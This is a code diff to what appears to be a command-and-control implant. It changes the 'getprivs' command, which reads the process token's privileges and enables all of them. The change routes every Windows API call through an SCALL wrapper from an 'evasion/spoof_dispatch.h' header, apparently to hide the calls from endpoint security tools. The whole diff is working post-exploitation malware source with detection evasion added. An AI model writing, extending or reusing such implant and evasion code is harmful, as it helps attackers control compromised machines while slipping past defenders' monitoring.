@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_GETPRIVS
 
@@ -18,16 +19,16 @@ auto declfn starburst::cmd_getprivs(
     HANDLE h_token = nullptr;
     HANDLE h_proc = reinterpret_cast<HANDLE>( static_cast<intptr_t>( -1 ) );
 
-    if ( !inst.advapi32.OpenProcessToken( h_proc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &h_token ) ) {
+    if ( !SCALL( inst, advapi32.OpenProcessToken, h_proc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &h_token ) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "OpenProcessToken failed" ) ) );
         return;
     }
 
     DWORD needed = 0;
-    inst.advapi32.GetTokenInformation( h_token, TokenPrivileges, nullptr, 0, &needed );
+    SCALL( inst, advapi32.GetTokenInformation, h_token, TokenPrivileges, nullptr, 0, &needed );
     if ( needed == 0 ) {
-        inst.kernel32.CloseHandle( h_token );
+        SCALL( inst, kernel32.CloseHandle, h_token );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetTokenInformation failed" ) ) );
         return;
@@ -35,15 +36,15 @@ auto declfn starburst::cmd_getprivs(
 
     auto tp = static_cast<TOKEN_PRIVILEGES*>( inst.heap_alloc( needed ) );
     if ( !tp ) {
-        inst.kernel32.CloseHandle( h_token );
+        SCALL( inst, kernel32.CloseHandle, h_token );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
         return;
     }
 
-    if ( !inst.advapi32.GetTokenInformation( h_token, TokenPrivileges, tp, needed, &needed ) ) {
+    if ( !SCALL( inst, advapi32.GetTokenInformation, h_token, TokenPrivileges, tp, needed, &needed ) ) {
         inst.heap_free( tp );
-        inst.kernel32.CloseHandle( h_token );
+        SCALL( inst, kernel32.CloseHandle, h_token );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetTokenInformation failed" ) ) );
         return;
@@ -53,7 +54,7 @@ auto declfn starburst::cmd_getprivs(
     auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
     if ( !output ) {
         inst.heap_free( tp );
-        inst.kernel32.CloseHandle( h_token );
+        SCALL( inst, kernel32.CloseHandle, h_token );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
         return;
@@ -63,11 +64,11 @@ auto declfn starburst::cmd_getprivs(
     for ( DWORD i = 0; i < tp->PrivilegeCount && off + 128 < out_cap; i++ ) {
         wchar_t priv_name_w[64] = { 0 };
         DWORD name_len = 64;
-        if ( !inst.advapi32.LookupPrivilegeNameW( nullptr, &tp->Privileges[i].Luid, priv_name_w, &name_len ) )
+        if ( !SCALL( inst, advapi32.LookupPrivilegeNameW, nullptr, &tp->Privileges[i].Luid, priv_name_w, &name_len ) )
             continue;
 
         char priv_name[64] = { 0 };
-        inst.kernel32.WideCharToMultiByte( CP_ACP, 0, priv_name_w, -1, priv_name, 64, nullptr, nullptr );
+        SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, priv_name_w, -1, priv_name, 64, nullptr, nullptr );
 
         uint32_t nlen = str_len( priv_name );
         memory::copy( output + off, priv_name, nlen );
@@ -97,12 +98,12 @@ auto declfn starburst::cmd_getprivs(
         tp_single.PrivilegeCount = 1;
         tp_single.Privileges[0].Luid = tp->Privileges[i].Luid;
         tp_single.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-        inst.advapi32.AdjustTokenPrivileges( h_token, FALSE, &tp_single, sizeof(tp_single), nullptr, nullptr );
+        SCALL( inst, advapi32.AdjustTokenPrivileges, h_token, FALSE, &tp_single, sizeof(tp_single), nullptr, nullptr );
     }
 
     output[off] = '\0';
     inst.heap_free( tp );
-    inst.kernel32.CloseHandle( h_token );
+    SCALL( inst, kernel32.CloseHandle, h_token );
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
     inst.heap_free( output );
 }
